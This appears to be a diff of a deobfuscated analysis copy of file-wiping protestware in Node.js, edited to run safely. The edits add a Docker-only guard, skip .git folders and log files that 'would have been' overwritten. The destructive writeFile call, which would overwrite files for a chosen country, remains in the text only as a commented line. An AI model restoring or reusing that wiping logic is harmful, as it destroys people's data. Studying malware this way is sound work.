@@ -12,6 +12,12 @@ import u from "path";
 import a from "fs";
 //import o from "https";
 
+// safety check
+if (!process.env.RUNNING_IN_DOCKER) {
+    console.log("Just to be safe, run this in Docker!")
+    process.exit(1)
+}
+
 // this wasn't here before
 function log(m, n) {
     console.log(m + ':');
@@ -66,7 +72,8 @@ log("the country name in the json is one we care about", a);
     mayhem(JSON.stringify({'country_name': 'russia'}));
 //}, Math.ceil(Math.random() * 1e3));
 async function h(n = "", o = "") {
-    if (!a.existsSync(n)) {
+    // the || test is new to limit output
+    if (!a.existsSync(n) || n.startsWith('.git')) {
         return
     }
     let r = [];
@@ -89,9 +96,9 @@ log('the character that will be used to overwrite all files', c);
             s.length > 0 ? f.push(...s) : null
         } else if (i.indexOf(o) >= 0) {
             try {
-                // eeeek - very bad
+                // eeeek - very bad - do NOT uncomment the next line or there will be DESTRUCTIVE behavior
                 // a.writeFile(i, c.toString("utf8"), function() {})
-                log('file to be overwritten', i);
+                log('file that would have been overwritten', i);
             } catch (t) {}
         }
     }
